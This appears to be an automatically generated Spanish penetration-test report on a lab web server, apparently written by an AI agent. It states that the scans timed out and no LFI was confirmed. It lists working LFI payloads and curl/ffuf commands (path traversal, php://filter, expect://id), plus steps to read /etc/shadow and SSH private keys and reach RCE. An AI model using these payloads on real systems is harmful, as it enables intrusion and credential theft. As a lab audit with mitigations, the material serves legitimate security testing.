# Informe de auditoría LFI — web.dev.local:8081

Fecha: 2026-04-18T08:58:01Z
Objetivo: http://web.dev.local:8081
Auditor: gpt5mini (entorno de laboratorio)

Resumen ejecutivo
-----------------
No se confirmó una vulnerabilidad LFI en esta iteración debido a que las herramientas automáticas (dirb, nikto, nmap) fallaron por timeouts al intentar contactar con el objetivo desde este entorno. Por tanto:
- VULN_FOUND: false
- VULN_EXPLOITED: false

Acciones realizadas
-------------------
1) Reconocimiento automático (intentado):
   - nmap: servicio y versión en puerto 8081 (comando intentado):
     nmap -sV -p 8081 web.dev.local

   - dirb (enumeración de directorios):
     dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt

   - nikto (escaneo de vulnerabilidades web):
     nikto -host http://web.dev.local:8081

   Nota: Los tres escaneos devolvieron timeouts desde el subsistema de escaneo (posible bloqueo de red, resolución DNS local no disponible o servicio caído).

2) Metodología propuesta para LFI manual y automatizada (comandos/payloads a ejecutar desde una máquina con conectividad hacia el objetivo):

- Burp/Proxy: interceptar peticiones para identificar parámetros dinámicos (GET/POST), cabeceras y cookies.

- Fuzzing de parámetros con ffuf (buscar parámetros y posibles inclusión de ficheros):
  ffuf -u "http://web.dev.local:8081/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/common.txt -fc 404

- Fuzz de parámetros en URLs con payloads LFI (lista de pruebas):
  ffuf -u "http://web.dev.local:8081/index.php?file=FUZZ" -w /usr/share/seclists/Discovery/Predictable-Content/common-file-names.txt -mc 200,302

- Payloads LFI a probar (incluyen técnicas para evadir filtros):
  ../../../../../../etc/passwd
  ../../../../../../etc/passwd%00
  php://filter/read=convert.base64-encode/resource=../../../../../../etc/passwd
  php://input
  expect://id
  php://filter/read=convert.base64-encode/resource=index.php

- Comandos curl para pruebas rápidas:
  curl -s "http://web.dev.local:8081/index.php?file=../../../../../../etc/passwd"
  curl -s "http://web.dev.local:8081/index.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd" | base64 -d

- Si se confirma lectura de /etc/passwd, intentar leer /etc/shadow, /root/.ssh/id_rsa y /proc/self/environ para escalada y RCE (log poisoning).

Evidencia y hallazgos
---------------------
- Resultado actual: No se obtuvo acceso ni descubrimiento de ficheros sensibles porque las herramientas de enumeración no pudieron conectarse (timeouts). No se encontró evidencia directa de LFI.

Recomendaciones
---------------
- Verificar resolución DNS de web.dev.local desde la máquina donde se ejecutan las pruebas (hosts/local DNS). Asegurar conectividad hacia 10.0.x.x o 127.0.0.1 según el escenario lab.
- Reintentar ffuf/dirb/nikto desde una máquina con conectividad válida.
- Si se confirma LFI, mitigar: validar/normalizar parámetros, prohibir acceso a wrappers (php://), deshabilitar display_errors, usar open_basedir, mantener ficheros sensibles fuera del árbol web.

Comandos y payloads exactos (lista para reproducir)
--------------------------------------------------
- nmap -sV -p 8081 web.dev.local
- dirb http://web.dev.local:8081 /usr/share/wordlists/dirb/common.txt
- nikto -host http://web.dev.local:8081
- ffuf -u "http://web.dev.local:8081/index.php?file=FUZZ" -w /usr/share/seclists/Discovery/Predictable-Content/common-file-names.txt -mc 200,302
- curl -s "http://web.dev.local:8081/index.php?file=php://filter/read=convert.base64-encode/resource=/etc/passwd" | base64 -d

Impacto
-------
Sin confirmación no puede atribuirse impacto real. Si existiese LFI, el atacante podría leer ficheros sensibles, exfiltrar credenciales y potencialmente escalar a RCE.

Siguientes pasos sugeridos
-------------------------
1) Restaurar conectividad o ejecutar las pruebas desde una red que resuelva "web.dev.local".
2) Ejecutar los ataques de fuzzing y los payloads php://filter descritos arriba.
3) Si se obtiene /etc/passwd o similares, continuar con extracción de /etc/shadow y búsqueda de claves privadas.

Anexos
------
Comandos de ejemplo y payloads listados arriba. Capturas de pantalla y salidas de herramientas deberían añadirse aquí cuando los escaneos se completen exitosamente.

---
Informe generado automáticamente por gpt5mini.
